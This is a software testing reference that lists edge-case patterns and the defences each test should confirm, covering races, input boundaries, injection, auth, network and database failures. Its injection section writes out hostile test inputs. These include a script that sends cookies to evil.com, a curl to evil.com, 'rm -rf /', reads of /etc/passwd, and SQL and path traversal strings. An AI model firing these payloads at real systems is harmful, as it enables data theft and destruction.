# Edge Case Test Patterns

This reference provides detailed patterns for edge case and resilience testing. Use it when building test plans to ensure coverage beyond happy paths.

Every production system eventually encounters these scenarios. The question is whether you've tested for them or whether your users discover them first.

---

## When to apply edge case testing

Always. The depth varies by feature risk:

| Feature Risk Level | Edge Case Depth |
|-------------------|-----------------|
| **High** (payments, auth, data mutation, regulated) | All categories below, comprehensive scenarios |
| **Medium** (CRUD features, integrations, workflows) | Concurrency, invalid input, auth, network failures |
| **Low** (internal tools, read-only views, static pages) | Invalid input, basic auth checks |

---

## Category 1: Concurrency & Race Conditions

Race conditions are among the hardest bugs to reproduce and the most dangerous in production. Test them explicitly.

### Patterns

**Optimistic locking conflict:**
```
Thread A: READ record (version=1)
Thread B: READ record (version=1)
Thread A: UPDATE record (version=1 -> 2) ✓
Thread B: UPDATE record (version=1 -> 2) ✗ 409 Conflict
```
Test: Send two concurrent PUT requests to the same resource. One should succeed, the other should return 409.

**Database deadlock:**
```
Transaction A: LOCK table_x, then LOCK table_y
Transaction B: LOCK table_y, then LOCK table_x
-> Deadlock detected, one transaction rolled back
```
Test: Create two concurrent transactions that lock resources in opposite order. Verify the system detects the deadlock and one caller receives a retryable error.

**Connection pool exhaustion:**
```
Send N+1 concurrent requests where N = pool size
-> Request N+1 waits or returns 503
-> No crash, no hang, no memory leak
```

**Double-submit / idempotency:**
```
Client sends POST /orders with idempotency-key: abc123
Network hiccup -> client retries same POST with same key
-> Only one order created
```

### What to verify
- No data corruption or duplication
- Proper error codes (409, 503, 423)
- Graceful degradation, not crashes
- Audit trail shows what happened

---

## Category 2: Boundary Values & Invalid Input

These test the edges of your input domain — where off-by-one errors, overflow bugs, and type confusion live.

### Numeric boundaries

| Input | Test Values |
|-------|------------|
| Positive integer | 0, 1, MAX_INT, MAX_INT+1, -1 |
| Amount / price | 0, 0.01, 0.001 (precision), 999999999.99, -1 |
| Quantity | 0, 1, MAX_ALLOWED, MAX_ALLOWED+1, -1 |
| Pagination | page=0, page=-1, page=999999, limit=0, limit=10001 |

### String boundaries

| Input | Test Values |
|-------|------------|
| Required string | empty `""`, whitespace `"   "`, null, missing |
| Length limit | exactly at limit, limit+1, single char |
| Special chars | `<script>`, `'; DROP`, `../../`, `\x00`, emoji `🎉`, RTL `\u200F` |
| Encoding | UTF-8 multibyte, Latin-1, mixed encoding |

### Collection boundaries

| Input | Test Values |
|-------|------------|
| Array | empty `[]`, single item, at max, over max |
| Nested objects | deeply nested (10+ levels), circular references |
| File upload | 0 bytes, 1 byte, at max size, over max, wrong MIME type |

### What to verify
- 400 Bad Request with field-level error messages
- No server errors (500) on invalid input
- No partial state changes on validation failure
- Error messages don't leak internal details

---

## Category 3: Injection Attacks

Test every user-controlled input for injection vectors. These are not optional, especially for features touching databases, HTML rendering, or system commands.

### SQL injection

```
Input: name = "'; DROP TABLE users; --"
Input: id = "1 OR 1=1"
Input: search = "\" UNION SELECT password FROM users --"
```
Verify: Parameterized queries prevent execution. Input is data, never code.

### XSS (Cross-Site Scripting)

```
Input: name = "<script>document.location='http://evil.com?c='+document.cookie</script>"
Input: bio = "<img src=x onerror=alert(1)>"
Input: url = "javascript:alert('xss')"
```
Verify: Output encoding prevents script execution. CSP headers as defense-in-depth.

### Command injection

```
Input: filename = "; rm -rf / #"
Input: hostname = "$(curl http://evil.com)"
Input: path = "| cat /etc/passwd"
```
Verify: Input is never passed to shell commands. If system calls are needed, use parameterized APIs.

### Path traversal

```
Input: file = "../../../../etc/passwd"
Input: file = "..%2F..%2F..%2Fetc%2Fpasswd"
Input: file = "....//....//etc/passwd"
```
Verify: File access is restricted to allowed directories. Path is canonicalized before use.

---

## Category 4: Authentication & Authorization Errors

These are the gates that protect your system. Test them as adversarial scenarios, not just happy-path logins.

### HTTP error code expectations

| Code | When | What to verify |
|------|------|----------------|
| **401** | No token, expired token, malformed token, revoked token | No data in response body, no action performed |
| **403** | Valid user but wrong role/permission, accessing another user's data | Action not performed, attempt audit-logged |
| **400** | Malformed auth header, missing required auth fields | Clear error, no information leakage |

### Adversarial patterns

```
# Token manipulation
- Use expired token -> 401
- Use token signed with wrong key -> 401
- Modify token payload (change role to admin) -> 401 or 403
- Use token from different environment -> 401

# Permission boundary
- User A accesses User B's resource -> 403
- Regular user hits admin endpoint -> 403
- Deleted user's token still valid? -> 401

# Session edge cases
- Concurrent sessions from same user -> defined behavior
- Session after password change -> old sessions invalidated
- Token refresh race condition -> no auth gap
```

---

## Category 5: Network & Infrastructure Failures

Production networks are unreliable. Test what happens when things go wrong between your services.

### Failure patterns

| Failure | Test Approach | Expected Behavior |
|---------|--------------|-------------------|
| **Connection refused** | External service is down | Circuit breaker opens, fallback response or 503 |
| **Timeout** | Service responds after configured timeout | Request cancelled, no thread leak, retryable error |
| **DNS failure** | Hostname doesn't resolve | Timeout with clear error, no infinite retry |
| **Partial response** | Connection drops mid-response | Detected, not parsed as valid, retried or errored |
| **SSL/TLS error** | Expired cert, wrong hostname | Connection rejected, not silently downgraded |
| **Connection pool exhaustion** | All connections in use | Backpressure, 503 with Retry-After, no crash |

### Circuit breaker behavior

```
Normal:     Request -> Service -> Response ✓
Failing:    Request -> Service -> Timeout ✗ (3 times)
Open:       Request -> Circuit Breaker -> 503 (fast fail, no call)
Half-open:  Request -> Service -> Response ✓ (probe)
Closed:     Request -> Service -> Response ✓ (recovered)
```

---

## Category 6: Database Edge Cases

### Lock contention

```
Transaction A: BEGIN -> UPDATE row WHERE id=1 (holds lock)
Transaction B: BEGIN -> UPDATE row WHERE id=1 (waits)
... lock_timeout exceeded ...
Transaction B: ERROR lock timeout -> ROLLBACK
```
Verify: Transaction B gets a clear error. No data corruption. Caller can retry.

### Transaction rollback on failure

```
BEGIN
INSERT INTO orders (...)          -- succeeds
INSERT INTO order_items (...)     -- succeeds
UPDATE inventory SET stock = -1   -- fails (CHECK constraint)
ROLLBACK                          -- all changes undone
```
Verify: No orphaned order without items. No negative inventory.

### Migration edge cases

```
Migration: ALTER TABLE ADD COLUMN with NOT NULL and no default
-> Fails if table has existing rows
```
Verify: Migration tested against production-like data volume. Rollback script exists and is tested.

---

## Category 7: Data Consistency & Idempotency

### Idempotency patterns

Every state-changing API should be testable for idempotency:

```
Request 1: POST /payments {amount: 100, idempotency_key: "abc"}
           -> 201 Created, payment_id: "pay_123"

Request 2: POST /payments {amount: 100, idempotency_key: "abc"}
           -> 200 OK, payment_id: "pay_123" (same result, no duplicate charge)
```

### Eventual consistency

```
Write to primary: UPDATE balance SET amount = 100
Read from replica: SELECT amount FROM balance
-> May return old value for N milliseconds
```
Verify: Application handles stale reads gracefully. UI shows loading state or documented staleness window.

---

## Mapping edge cases to test layers

| Edge Case Category | Unit | Integration | E2E | Resilience |
|-------------------|------|-------------|-----|------------|
| Boundary values | ✓ Primary | ✓ | | |
| Invalid input | ✓ Primary | ✓ | ✓ | |
| Injection | ✓ | ✓ Primary | ✓ | |
| Auth errors (401/403) | | ✓ Primary | ✓ | |
| Client errors (400/404/409) | ✓ | ✓ Primary | ✓ | |
| Concurrency | | ✓ Primary | | ✓ |
| DB locks / deadlocks | | ✓ Primary | | ✓ |
| Network failures | | ✓ | | ✓ Primary |
| Circuit breakers | | ✓ | | ✓ Primary |
| Idempotency | | ✓ Primary | | ✓ |
| Data consistency | | ✓ Primary | | ✓ |
